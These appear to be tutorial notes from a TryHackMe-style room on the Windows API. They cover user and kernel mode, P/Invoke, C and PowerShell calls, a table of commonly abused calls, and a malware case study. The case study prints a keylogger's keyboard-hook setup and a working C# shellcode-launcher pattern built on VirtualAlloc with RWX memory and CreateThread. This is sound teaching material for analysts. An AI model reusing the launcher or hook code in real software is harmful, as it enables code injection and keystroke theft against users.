## Table of Contents

  - [Subsystem and Hardware interaction](#Subsystem\and\Hardware\interaction)
  - [OS Libraries](#OS\Libraries)
    - [Windows Header File](#Windows\Header\File)
    - [P/Invoke](#P/Invoke)
    - [C API Implementations](#C\API\Implementations)
  - [.NET and PowerShell API implementations](#.NET\and\PowerShell\API\implementations)
  - [Commonly Abused API functions](#Commonly\Abused\API\functions)
- [Malware Case Study](#malware\case\study)
- [Shellcode Launcher](#shellcode\launcher)

The Windows API provides native functionality to interact with key components of the Windows operating system. The API is widely used by many, including red teamers, threat actors, blue teamers, software developers, and solution providers.

The API can integrate seamlessly with the Windows system, offering its range of use cases. You may see the Win32 API being used for offensive tool and malware development, **EDR** (**E**ndpoint **D**etection & **R**esponse) engineering, and general software applications. For more information about all of the use cases for the API, check out the [Windows API Index](https://docs.microsoft.com/en-us/windows/win32/apiindex/windows-api-list).


## Subsystem and Hardware interaction
Programs often need to access or modify Windows subsystems or hardware but are restricted to maintain machine stability. To solve this: Microsoft released the Win32 API, a library to interface between user-mode applications and the kernel

Windows distinguishes hardware access by two distinct modes: **user** and **kernel mode**. These modes determine the hardware, kernel, and memory access an application or driver is permitted. API or system calls interface between each mode, sending information to the system to be processed in kernel mode.

|   |   |
|---|---|
|**User mode**|**Kernel mode**|
|No direct hardware access|Direct hardware access|
|Access to "owned" memory locations|Access to entire physical memory|

User Application
->
(User Mode/Userland)
API (Win32 API)
->
Switching Point
System Calls ->
kernel -> Physical Memory | hardware

Does a process in the user mode have direct hardware access?
No

Does launching an application as an administrator open the process in kernel-mode?
No


The Win32 API, more commonly known as the Windows API, has several dependent components that are used to define the structure and organization of the API.

Let’s break the Win32 API up via a top-down approach. We’ll assume the API is the top layer and the parameters that make up a specific call are the bottom layer. In the table below, we will describe the top-down structure at a high level and dive into more detail later.

|   |   |
|---|---|
|**Layer**|**Explanation**|
|API|A top-level/general term or theory used to describe any call found in the win32 API structure.|
|Header files or imports|Defines libraries to be imported at run-time, defined by header files or library imports. Uses pointers to obtain the function address.|
|Core DLLs|A group of four DLLs that define call structures. (KERNEL32, USER32, and ADVAPI32). These DLLs define kernel and user services that are not contained in a single subsystem.|
|Supplemental DLLs|Other DLLs defined as part of the Windows API. Controls separate subsystems of the Windows OS. ~36 other defined DLLs. (NTDLL, COM, FVEAPI, etc.)|
|Call Structures|Defines the API call itself and parameters of the call.|
|API Calls|The API call used within a program, with function addresses obtained from pointers.|
|In/Out Parameters|The parameter values that are defined by the call structures.|


## OS Libraries
Each API call of the Win32 library resides in memory and requires a pointer to a memory address. The process of obtaining pointers to these functions is obscured because of **ASLR** (**A**ddress **S**pace **L**ayout **R**andomization) implementations; each language or package has a unique procedure to overcome ASLR. Throughout this room, we will discuss the two most popular implementations: **[P/Invoke](https://docs.microsoft.com/en-us/dotnet/standard/native-interop/pinvoke)** and the **[Windows header file](https://docs.microsoft.com/en-us/windows/win32/winprog/using-the-windows-headers)**.

### Windows Header File
Microsoft has released the Windows header file, also known as the Windows loader, as a direct solution to the problems associated with ASLR’s implementation. Keeping the concept at a high level, at runtime, the loader will determine what calls are being made and create a thunk table to obtain function addresses or pointers.

Luckily, we do not have to dive deeper than that to continue working with API calls if we do not desire to do so.

Once the `windows.h` file is included at the top of an unmanaged program; any Win32 function can be called.


### P/Invoke
Microsoft describes P/Invoke or platform invoke as a technology that allows you to access structs, callbacks, and functions in unmanaged libraries from your managed code.

P/invoke provides tools to handle the entire process of invoking an unmanaged function from managed code or, in other words, calling the Win32 API. P/invoke will kick off by importing the desired DLL that contains the unmanaged function or Win32 API call. Below is an example of importing a DLL with options.

```
```csharp
using System;
using System.Runtime.InteropServices;

public class Program
{
[DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
...
}
```
In the above code, we are importing the DLL `user32` using the attribute: `DLLImport`.

Note: a semicolon is not included because the p/invoke function is not yet complete. In the second step, we must define a managed method as an external one. The `extern` keyword will inform the runtime of the specific DLL that was previously imported. Below is an example of creating the external method.
```
...
private static extern int MessageBox(IntPtr hWnd, string lpText, string lpCaption, uint uType);
#Add this below the three dots above [First block]
```


API calls are the second main component of the Win32 library. These calls offer extensibility and flexibility that can be used to meet a plethora of use cases. Most Win32 API calls are well documented under the [Windows API documentation](https://docs.microsoft.com/en-us/windows/win32/apiindex/windows-api-list) and [pinvoke.net](http://pinvoke.net/).

In this task, we will take an introductory look at naming schemes and in/out parameters of API calls.

API call functionality can be extended by modifying the naming scheme and appending a representational character. Below is a table of the characters Microsoft supports for its naming scheme.

|   |   |
|---|---|
|**Character**|**Explanation**|
|A|Represents an 8-bit character set with ANSI encoding|
|W|Represents a Unicode encoding|
|Ex|Provides extended functionality or in/out parameters to the API call|


Each API call also has a pre-defined structure to define its in/out parameters. You can find most of these structures on the corresponding API call document page of the windows documentation, along with explainations of each I/O parameter. https://docs.microsoft.com/en-us/windows/win32/apiindex/windows-api-list


Let’s take a look at the `WriteProcessMemory` API call as an example. Below is the I/O structure for the call obtained [here](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory).

```cpp
BOOL WriteProcessMemory(
  [in]  HANDLE  hProcess,
  [in]  LPVOID  lpBaseAddress,
  [in]  LPCVOID lpBuffer,
  [in]  SIZE_T  nSize,
  [out] SIZE_T  *lpNumberOfBytesWritten
);
```


### C API Implementations
Microsoft provides low-level programming languages such as C and C++ with a pre-configured set of libraries that we can use to access needed API calls.

The `windows.h` header file, as discussed in task 4, is used to define call structures and obtain function pointers. To include the windows header, prepend the line below to any C or C++ program.

`#include <windows.h>`

Let’s jump right into creating our first API call. As our first objective, we aim to create a pop-up window with the title: “Hello THM!” using `CreateWindowExA`. To reiterate what was covered in task 5, let’s observe the in/out parameters of the call.

```cpp
HWND CreateWindowExA(
  [in]           DWORD     dwExStyle, // Optional windows styles
  [in, optional] LPCSTR    lpClassName, // Windows class
  [in, optional] LPCSTR    lpWindowName, // Windows text
  [in]           DWORD     dwStyle, // Windows style
  [in]           int       X, // X position
  [in]           int       Y, // Y position
  [in]           int       nWidth, // Width size
  [in]           int       nHeight, // Height size
  [in, optional] HWND      hWndParent, // Parent windows
  [in, optional] HMENU     hMenu, // Menu
  [in, optional] HINSTANCE hInstance, // Instance handle
  [in, optional] LPVOID    lpParam // Additional application data
);
```

Then take the pre-defined parameters and assign values to them. Each parameter for an API call has an explanation of it purpose and potential values. 

 Below is an example of a complete call to `CreateWindowsExA`.

```cpp
HWND hwnd = CreateWindowsEx(
	0, 
	CLASS_NAME, 
	L"Hello THM!", 
	WS_OVERLAPPEDWINDOW, 
	CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, 
	NULL, 
	NULL, 
	hInstance, 
	NULL
	);
```

We’ve defined our first API call in C! Now we can implement it into an application and use the functionality of the API call. Below is an example application that uses the API to create a small blank window.

```cpp
BOOL Create(
        PCWSTR lpWindowName,
        DWORD dwStyle,
        DWORD dwExStyle = 0,
        int x = CW_USEDEFAULT,
        int y = CW_USEDEFAULT,
        int nWidth = CW_USEDEFAULT,
        int nHeight = CW_USEDEFAULT,
        HWND hWndParent = 0,
        HMENU hMenu = 0
        )
    {
        WNDCLASS wc = {0};

        wc.lpfnWndProc   = DERIVED_TYPE::WindowProc;
        wc.hInstance     = GetModuleHandle(NULL);
        wc.lpszClassName = ClassName();

        RegisterClass(&wc);

        m_hwnd = CreateWindowEx(
            dwExStyle, ClassName(), lpWindowName, dwStyle, x, y,
            nWidth, nHeight, hWndParent, hMenu, GetModuleHandle(NULL), this
            );

        return (m_hwnd ? TRUE : FALSE);
    }
```


## .NET and PowerShell API implementations
P/Invoke allows us to import DLLs and assign pointers to API calls.

```cpp
class Win32 {
	[DllImport("kernel32")]
	public static extern IntPtr GetComputerNameA(StringBuilder lpBuffer, ref uint lpnSize);
}
```

The class function stores defined API calls and a definition to reference in all future methods.

The library in which the API call structure is stored must now be imported using `DllImport`. The imported DLLs act similar to the header packages but require that you import a specific DLL with the API call you are looking for. You can reference the [API index](https://docs.microsoft.com/en-us/windows/win32/apiindex/windows-api-list) or [pinvoke.net](http://pinvoke.net/) to determine where a particular API call is located in a DLL.

From the DLL import, we can create a new pointer to the API call we want to use, notably defined by `intPtr`. Unlike other low-level languages, you must specify the in/out parameter structure in the pointer. As discussed in task 5, we can find the in/out parameters for the required API call from the Windows documentation.

Now we can implement the defined API call into an application and use its functionality. Below is an example application that uses the API to get the computer name and other information of the device it is run on.

```csharp
class Win32 {
	[DllImport("kernel32")]
	public static extern IntPtr GetComputerNameA(StringBuilder lpBuffer, ref uint lpnSize);
}

static void Main(string[] args) {
	bool success;
	StringBuilder name = new StringBuilder(260);
	uint size = 260;
	success = GetComputerNameA(name, ref size);
	Console.WriteLine(name.ToString());
}
```

If successful, the program should return the computer name of the current device.

Now that we’ve covered how it can be accomplished in .NET let’s look at how we can adapt the same syntax to work in PowerShell.

Defining the API call is almost identical to .NET’s implementation, but we will need to create a method instead of a class and add a few additional operators.

```powershell
$MethodDefinition = @"
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
"@;
```
The calls are now defined but powershell requires on further step before they can be initialized. We must create a new type for the pointer of each Win32 DLL within the method definition. The function Add-type will drop a temporary file in the /temp directory and compule needed functions using csc.exe. 
EX:
```powershell
$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;
```

We can now use the required API calls with the syntax below.

`[Win32.Kernel32]::<Imported Call>()`

## Commonly Abused API functions
Several API calls within the Win32 library lend themselves to be easily leveraged for malicious activity.

Several entities have attempted to document and organize all available API calls with malicious vectors, including [SANs](https://www.sans.org/white-papers/33649/) and [MalAPI.io](http://malapi.io/).

While many calls are abused, some are seen in the wild more than others. Below is a table of the most commonly abused API organized by frequency in a collection of samples.

|   |   |
|---|---|
|**API Call**|**Explanation**|
|LoadLibraryA|Maps a specified DLL  into the address space of the calling process|
|GetUserNameA|Retrieves the name of the user associated with the current thread|
|GetComputerNameA|Retrieves a NetBIOS or DNS  name of the local computer|
|GetVersionExA|Obtains information about the version of the operating system currently running|
|GetModuleFileNameA|Retrieves the fully qualified path for the file of the specified module and process|
|GetStartupInfoA|Retrieves contents of STARTUPINFO structure (window station, desktop, standard handles, and appearance of a process)|
|GetModuleHandle|Returns a module handle for the specified module if mapped into the calling process's address space|
|GetProcAddress|Returns the address of a specified exported DLL  function|
|VirtualProtect|Changes the protection on a region of memory in the virtual address space of the calling process|


# Malware Case Study
Now that we understand the underlying implementations of the Win32 library and commonly abused API calls, let’s break down two malware samples and observe how their calls interact.

In this task, we will be breaking down a C# keylogger and shellcode launcher.

Keylogger~
To begin analyzing the keylogger, we need to collect which API calls and hooks it is implementing. Because the keylogger is written in C#, it must use P/Invoke to obtain pointers for each call. Below is a snippet of the p/invoke definitions of the malware sample source code.

```csharp
[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
[return: MarshalAs(UnmanagedType.Bool)]
private static extern bool UnhookWindowsHookEx(IntPtr hhk);
[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
private static extern IntPtr GetModuleHandle(string lpModuleName);
private static int WHKEYBOARDLL = 13;
[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
private static extern IntPtr GetCurrentProcess();
```

Below is an explanation of each API call and its respective use.

|   |   |
|---|---|
|**API Call**|**Explanation**|
|SetWindowsHookEx|Installs a memory hook into a hook chain to monitor for certain events|
|UnhookWindowsHookEx|Removes an installed hook from the hook chain|
|GetModuleHandle|Returns a module handle for the specified module if mapped into the calling process's address space|
|GetCurrentProcess|Retrieves a pseudo handle for the current process.|

To maintain the ethical integrity of this case study, we will not cover how the sample collects each keystroke. We will analyze how the sample sets a hook on the current process. Below is a snippet of the hooking section of the malware sample source code.

```csharp
public static void Main() {
	_hookID = SetHook(_proc);
	Application.Run();
	UnhookWindowsHookEx(_hookID);
	Application.Exit();
}
private static IntPtr SetHook(LowLevelKeyboardProc proc) {
	using (Process curProcess = Process.GetCurrentProcess()) {
		return SetWindowsHookEx(WHKEYBOARDLL, proc, GetModuleHandle(curProcess.ProcessName), 0);
	}
}
```
Let’s understand the objective and procedure of the keylogger, then assign their respective API call from the above snippet.

Using the [Windows API documentation](https://docs.microsoft.com/en-us/windows/win32/apiindex/windows-api-list) and the context of the above snippet, begin analyzing the keylogger, using questions 1 - 4 as a guide to  work through the sample.

# Shellcode Launcher
```csharp
private static UInt32 MEM_COMMIT = 0x1000;
private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
[DllImport("kernel32")]
private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
[DllImport("kernel32")]
private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
[DllImport("kernel32")]
private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
```
Below is an explanation of each API call and its respective use.

|   |   |
|---|---|
|**API Call**|**Explanation**|
|VirtualAlloc|Reserves, commits, or changes the state of a region of pages in the virtual address space of the calling process.|
|WaitForSingleObject|Waits until the specified object is in the signaled state or the time-out interval elapses|
|CreateThread|Creates a thread to execute within the virtual address space of the calling process|

We will now analyze how the shellcode is written to and executed from memory.

```csharp
UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
IntPtr hThread = IntPtr.Zero;
UInt32 threadId = 0;
IntPtr pinfo = IntPtr.Zero;
hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
WaitForSingleObject(hThread, 0xFFFFFFFF);
return;
```


















































